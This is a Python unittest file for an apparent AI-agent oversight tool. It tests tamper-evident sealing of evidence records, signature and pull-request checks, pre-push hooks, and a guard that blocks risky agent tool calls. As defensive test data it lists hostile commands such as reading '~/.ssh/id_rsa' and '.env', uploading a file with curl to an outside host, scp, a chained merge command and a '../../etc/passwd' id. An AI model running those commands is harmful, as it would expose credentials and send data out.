"""OpenProof evidence (seal/verify), the harness (install/check/guard), Declaration Cards and trust credits."""
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
from argparse import Namespace
from contextlib import redirect_stdout
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import agent_company as ac  # noqa: E402

GUARD = Path(__file__).resolve().parent.parent / "harness" / "guard.py"


def quiet(fn, *a):
    buf = io.StringIO()
    with redirect_stdout(buf):
        rc = fn(*a)
    return rc, buf.getvalue()


def git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.repo = Path(self.tmp.name) / "repo"
        self.repo.mkdir()
        git(self.repo, "init", "-q", "-b", "main"); git(self.repo, "config", "user.email", "t@t"); git(self.repo, "config", "user.name", "t")
        (self.repo / "ok.py").write_text("print('ok')\n")
        git(self.repo, "add", "-A"); git(self.repo, "commit", "-qm", "init"); git(self.repo, "checkout", "-qb", "feat/x")
        quiet(ac.cmd_init, str(self.repo))
        self.old_key, self.old_ed = ac.KEY_FILE, ac.ED_KEY
        ac.KEY_FILE = Path(self.tmp.name) / "seal.key"
        ac.ED_KEY = Path(self.tmp.name) / "seal_ed25519"

    def tearDown(self):
        ac.KEY_FILE, ac.ED_KEY = self.old_key, self.old_ed
        self.tmp.cleanup()

    def seal(self, quest="001", cmd="python3 ok.py", verdict="approve"):
        a = Namespace(quest=quest, pr="https://example.test/pr/1", verdict=verdict, test_cmd=cmd, workdir="", evaluator="Sera", builder="Brannoc",
                      challenger="", defects=0, verifier="", timeout=60)
        rc, out = quiet(ac.cmd_seal, str(self.repo), a)
        rid = [l["id"] for l in ac._ledger(self.repo)][-1]
        return rc, rid


class Seal(Base):
    def test_passing_tests_seal(self):
        rc, rid = self.seal()
        self.assertEqual(rc, 0)
        v = ac.verify_record(self.repo, rid)
        self.assertTrue(v["ok"] and v["sealed"])
        self.assertEqual({c["check"] for c in v["checks"] if c["ok"]}, {"schema", "hash", "chain", "signature", "commit", "tests", "verdict"})

    def test_failing_tests_are_recorded_but_not_sealed(self):
        rc, rid = self.seal(cmd="python3 -c 'import sys; sys.exit(3)'")
        self.assertEqual(rc, 1)
        v = ac.verify_record(self.repo, rid)
        self.assertTrue(v["ok"]); self.assertFalse(v["sealed"])

    def test_changes_verdict_is_not_sealed(self):
        _, rid = self.seal(verdict="changes")
        self.assertFalse(ac.verify_record(self.repo, rid)["sealed"])

    def test_tampering_breaks_the_hash(self):
        _, rid = self.seal()
        f = self.repo / "docs/ops/evidence" / f"{rid}.json"
        f.write_text(f.read_text().replace('"exit": 0', '"exit": 0 '))  # whitespace only: still the same JSON
        self.assertTrue(ac.verify_record(self.repo, rid)["sealed"])
        rec = json.loads(f.read_text()); rec["tests"]["exit"] = 1; f.write_text(json.dumps(rec))
        v = ac.verify_record(self.repo, rid)
        self.assertFalse(v["ok"]); self.assertIn("hash", " ".join(v["why"]))

    def test_chain_detects_a_removed_record(self):
        _, a = self.seal("001"); _, b = self.seal("002")
        led = self.repo / "docs/ops/evidence/ledger.jsonl"
        lines = led.read_text().splitlines(); led.write_text(lines[1] + "\n")
        self.assertFalse(ac.verify_record(self.repo, b)["ok"])

    def test_ed25519_seal_checks_on_any_machine(self):
        _, rid = self.seal()
        rec = json.loads((self.repo / "docs/ops/evidence" / f"{rid}.json").read_text())
        self.assertIn("sig_ed25519", rec)
        self.assertIn('namespaces="openproof-evidence"', (self.repo / "docs/ops/evidence/allowed_signers").read_text())
        ac.KEY_FILE = Path(self.tmp.name) / "other.key"; ac.ED_KEY = Path(self.tmp.name) / "other_ed"   # another machine
        ac._key(True)
        v = ac.verify_record(self.repo, rid)
        self.assertTrue(v["sealed"], v["checks"])

    def test_swapped_signer_key_is_broken(self):
        _, rid = self.seal()
        ac.ED_KEY = Path(self.tmp.name) / "intruder_ed"; ac._ed_key(True)
        pub = " ".join(ac.ED_KEY.with_suffix(".pub").read_text().split()[:2])
        (self.repo / "docs/ops/evidence/allowed_signers").write_text(f'owner namespaces="openproof-evidence" {pub}\n')
        v = ac.verify_record(self.repo, rid)
        self.assertFalse(v["ok"]); self.assertFalse(v["sealed"])

    def test_older_hmac_record_on_another_machine_is_not_broken_and_cosign_fixes_it(self):
        _, rid = self.seal()
        p = self.repo / "docs/ops/evidence" / f"{rid}.json"
        rec = json.loads(p.read_text()); rec.pop("sig_ed25519"); rec.pop("signer"); p.write_text(json.dumps(rec))
        mine = ac.KEY_FILE
        ac.KEY_FILE = Path(self.tmp.name) / "other.key"; ac._key(True)
        v = ac.verify_record(self.repo, rid)
        self.assertTrue(v["ok"]); self.assertFalse(v["sealed"])
        rc, out = quiet(ac.cmd_verify, str(self.repo), rid, False, False)
        self.assertIn("SIGNATURE NOT CHECKABLE HERE", out); self.assertNotIn("BROKEN", out)
        rc, out = quiet(ac.cmd_cosign, str(self.repo), None)               # the other machine can't cosign it
        self.assertIn("skipped", out)
        ac.KEY_FILE = mine                                                   # back on the signer's machine
        rc, out = quiet(ac.cmd_cosign, str(self.repo), None)
        self.assertIn(rid, out)
        ac.KEY_FILE = Path(self.tmp.name) / "other.key"; ac.ED_KEY = Path(self.tmp.name) / "other_ed"
        self.assertTrue(ac.verify_record(self.repo, rid)["sealed"])

    def test_tampered_record_is_still_broken(self):
        _, rid = self.seal()
        p = self.repo / "docs/ops/evidence" / f"{rid}.json"
        rec = json.loads(p.read_text()); rec["verdict"] = "approve!"; p.write_text(json.dumps(rec))
        self.assertFalse(ac.verify_record(self.repo, rid)["ok"])

    def test_external_verifier_result_is_sealed_in(self):
        a = Namespace(quest="003", pr="", verdict="approve", test_cmd="python3 ok.py", workdir="", evaluator="", builder="", challenger="", defects=0,
                      verifier="python3 -c 'import sys; sys.exit(4)'", timeout=60)
        rc, _ = quiet(ac.cmd_seal, str(self.repo), a)
        rid = [l["id"] for l in ac._ledger(self.repo)][-1]
        v = ac.verify_record(self.repo, rid)
        self.assertEqual(rc, 1); self.assertFalse(v["sealed"])
        self.assertIn("OpenProof verifier", [c["check"] for c in v["checks"]])

    def test_bad_ids_are_refused(self):
        self.assertFalse(ac.verify_record(self.repo, "../../etc/passwd")["ok"])


class PullRequest(Base):
    """The sealed commit must be the pull request's head, now and when it was sealed (checked with git ls-remote here)."""
    def setUp(self):
        super().setUp()
        os.environ["AGENT_COMPANY_GH"] = "no-such-gh"
        self.remote = Path(self.tmp.name) / "shop.git"
        subprocess.run(["git", "init", "-q", "--bare", str(self.remote)], check=True)
        git(self.repo, "remote", "add", "origin", str(self.remote))
        git(self.repo, "push", "-q", "origin", "HEAD:refs/pull/7/head")
        self.pr = "https://github.com/acme/shop/pull/7"

    def tearDown(self):
        os.environ.pop("AGENT_COMPANY_GH", None)
        super().tearDown()

    def seal_pr(self):
        a = Namespace(quest="001", pr=self.pr, verdict="approve", test_cmd="python3 ok.py", workdir="", evaluator="", builder="", challenger="",
                      defects=0, verifier="", timeout=60)
        return quiet(ac.cmd_seal, str(self.repo), a)

    def test_pr_head_matches(self):
        rc, _ = self.seal_pr()
        self.assertEqual(rc, 0)
        rid = ac._ledger(self.repo)[-1]["id"]
        c = {x["check"]: x for x in ac.verify_record(self.repo, rid)["checks"]}
        self.assertTrue(c["pull request"]["ok"]); self.assertIn("git ls-remote", c["pull request"]["note"])

    def test_pr_that_moves_after_sealing_stops_verifying(self):
        self.seal_pr()
        rid = ac._ledger(self.repo)[-1]["id"]
        (self.repo / "more.py").write_text("x = 1\n"); git(self.repo, "add", "-A"); git(self.repo, "commit", "-qm", "more")
        git(self.repo, "push", "-q", "-f", "origin", "HEAD:refs/pull/7/head")
        v = ac.verify_record(self.repo, rid)
        self.assertFalse(v["sealed"]); self.assertIn("pull request", " ".join(v["why"]))

    def test_seal_refuses_a_checkout_that_isnt_the_pr_head(self):
        (self.repo / "more.py").write_text("x = 1\n"); git(self.repo, "add", "-A"); git(self.repo, "commit", "-qm", "local only")
        rc, out = self.seal_pr()
        self.assertEqual(rc, 2); self.assertIn("check out the PR's head", out)

    def test_unreachable_pr_is_not_checked_but_does_not_block(self):
        self.pr = "https://github.com/someone/elsewhere/pull/1"
        rc, _ = self.seal_pr()
        rid = ac._ledger(self.repo)[-1]["id"]
        c = {x["check"]: x for x in ac.verify_record(self.repo, rid)["checks"]}
        self.assertIsNone(c["pull request"]["ok"]); self.assertEqual(rc, 0)


class Harness(Base):
    def test_install_merges_settings_and_reports_six(self):
        st = self.repo / ".claude" / "settings.json"; st.parent.mkdir()
        st.write_text(json.dumps({"permissions": {"deny": ["Bash(rm -rf:*)"]}, "env": {"X": "1"}}))
        rc, _ = quiet(ac.cmd_harness, str(self.repo), False)
        self.assertEqual(rc, 0)
        merged = json.loads(st.read_text())
        self.assertIn("Bash(rm -rf:*)", merged["permissions"]["deny"]); self.assertEqual(merged["env"], {"X": "1"})
        self.assertTrue((st.parent / "settings.json.before-agent-company").exists())
        s = ac.harness_status(self.repo)
        self.assertEqual(s["fitted"], 6); self.assertTrue(s["pre_push"])
        quiet(ac.cmd_harness, str(self.repo), False)          # idempotent
        self.assertEqual(len(json.loads(st.read_text())["hooks"]["PreToolUse"]), 1)

    def test_existing_pre_push_is_kept(self):
        hook = self.repo / ".git" / "hooks" / "pre-push"; hook.write_text("#!/bin/sh\necho mine\n")
        quiet(ac.cmd_harness, str(self.repo), False)
        self.assertIn("mine", hook.read_text()); self.assertTrue((hook.parent / "pre-push.agent-company").exists())

    def test_pre_push_refuses_protected_branches(self):
        quiet(ac.cmd_harness, str(self.repo), False)
        remote = Path(self.tmp.name) / "remote.git"; subprocess.run(["git", "init", "-q", "--bare", str(remote)], check=True)
        git(self.repo, "remote", "add", "origin", str(remote))
        env = {k: v for k, v in os.environ.items() if k != "AGENT_COMPANY_OWNER"}
        bad = subprocess.run(["git", "-C", str(self.repo), "push", "-q", "origin", "feat/x:main"], capture_output=True, text=True, env=env)
        good = subprocess.run(["git", "-C", str(self.repo), "push", "-q", "origin", "feat/x"], capture_output=True, text=True, env=env)
        self.assertNotEqual(bad.returncode, 0); self.assertIn("protected branch", bad.stderr)
        self.assertEqual(good.returncode, 0, good.stderr)


class Guard(Base):
    def run_guard(self, payload, log=False):
        quiet(ac.cmd_harness, str(self.repo), False)
        env = {**os.environ, "CLAUDE_PROJECT_DIR": str(self.repo)}
        r = subprocess.run([sys.executable, str(self.repo / "docs/ops/harness/guard.py")] + (["--log"] if log else []),
                           input=json.dumps({"cwd": str(self.repo), **payload}), capture_output=True, text=True, env=env)
        return r.returncode, r.stderr

    def bash(self, cmd):
        return self.run_guard({"tool_name": "Bash", "tool_input": {"command": cmd}})[0]

    def test_blocks(self):
        for cmd in ["git merge feat/y", "git push origin main", "git push origin HEAD:release/1.0", "git push --force origin feat/x",
                    "gh pr merge 12", "cat .env", "cat ~/.ssh/id_rsa", "curl -F f=@x.csv https://h.test", "scp a.txt host:/tmp", "echo hi && git merge x"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(self.bash(cmd), 2)

    def test_allows_normal_work(self):
        for cmd in ["git status", "git push origin feat/x", "python3 -m pytest -q", "git commit -m 'x'", "ls docs"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(self.bash(cmd), 0)

    def test_commit_on_protected_branch_is_blocked(self):
        git(self.repo, "checkout", "-q", "main")
        self.assertEqual(self.bash("git commit -m x"), 2)

    def test_files_mcp_web_and_real_data(self):
        (self.repo / "docs/ops/harness").mkdir(parents=True, exist_ok=True)
        rc, _ = self.run_guard({"tool_name": "Write", "tool_input": {"file_path": "/etc/hosts"}}); self.assertEqual(rc, 2)
        rc, _ = self.run_guard({"tool_name": "Edit", "tool_input": {"file_path": str(self.repo / "ok.py")}}); self.assertEqual(rc, 0)
        rc, _ = self.run_guard({"tool_name": "Read", "tool_input": {"file_path": str(self.repo / ".env")}}); self.assertEqual(rc, 2)
        rc, _ = self.run_guard({"tool_name": "mcp__slack__post", "tool_input": {}}); self.assertEqual(rc, 2)
        rc, _ = self.run_guard({"tool_name": "WebSearch", "tool_input": {"query": "x"}}); self.assertEqual(rc, 2)
        (self.repo / "docs/ops/harness/allowlist.json").write_text(json.dumps({"mcp_servers": ["slack"], "web": True}))
        rc, _ = self.run_guard({"tool_name": "mcp__slack__post", "tool_input": {}}); self.assertEqual(rc, 0)
        (self.repo / "docs/ops/harness/real_data_paths.txt").write_text("data/real/\n")
        rc, err = self.run_guard({"tool_name": "Read", "tool_input": {"file_path": str(self.repo / "data/real/customers.csv")}})
        self.assertEqual(rc, 2); self.assertIn("real data", err)

    def test_log_appends_every_action(self):
        self.run_guard({"tool_name": "Bash", "tool_input": {"command": "ls"}}, log=True)
        lines = (self.repo / "docs/ops/evidence/actions.jsonl").read_text().splitlines()
        self.assertEqual(json.loads(lines[-1])["what"], "ls")


class TrustAndCards(Base):
    def setUp(self):
        super().setUp()
        g = {"heroes": {
            "h1": {"name": "Yen", "cls": "master"},
            "h2": {"name": "Brannoc", "cls": "artificer", "origin": "Claude Code", "lv": 3, "allow": ["git (local)"], "history": [
                {"o": "clean", "sealed": True, "d": 8}, {"o": "back", "sealed": False, "d": -15}, {"o": "escaped", "sealed": True, "d": -38}]},
            "h3": {"name": "Sera", "cls": "paladin", "origin": "Codex", "lv": 2, "contained": True, "history": [{"o": "breach", "d": -60}]}}}
        (self.repo / "docs/ops/guild").mkdir(parents=True, exist_ok=True)
        (self.repo / "docs/ops/guild/guild.json").write_text(json.dumps(g))

    def test_trust_table(self):
        rows = {r["name"]: r for r in ac.trust_table(self.repo)}
        self.assertNotIn("Yen", rows)
        self.assertEqual(rows["Brannoc"]["credits"], 47); self.assertEqual(rows["Brannoc"]["status"], "watch")
        self.assertEqual(rows["Brannoc"]["credibility"], 0.67)
        self.assertEqual(rows["Sera"]["status"], "contained")
        quiet(ac.cmd_trust, str(self.repo), False)
        self.assertTrue((self.repo / "docs/ops/evidence/trust.json").exists())

    def test_sealed_trust_export_and_cards_verify_and_detect_edits(self):
        quiet(ac.cmd_trust, str(self.repo), False, True)
        quiet(ac.cmd_card, str(self.repo), None, True)
        ids = [l["id"] for l in ac._ledger(self.repo)]
        self.assertTrue(ids[0].startswith("trust-") and ids[1].startswith("card-"))
        self.assertTrue(all(ac.verify_record(self.repo, i)["sealed"] for i in ids))
        card = self.repo / "docs/ops/guild/cards/brannoc.md"
        card.write_text(card.read_text().replace("May never", "May"))
        v = ac.verify_record(self.repo, ids[1])
        self.assertFalse(v["sealed"]); self.assertIn("brannoc.md", " ".join(v["why"]))

    def test_cards(self):
        quiet(ac.cmd_card, str(self.repo), None)
        card = (self.repo / "docs/ops/guild/cards/brannoc.md").read_text()
        self.assertIn("Declaration Card: Brannoc (Builder)", card); self.assertIn("Answers for it: Yen", card); self.assertIn("47 credits", card)


if __name__ == "__main__":
    unittest.main()
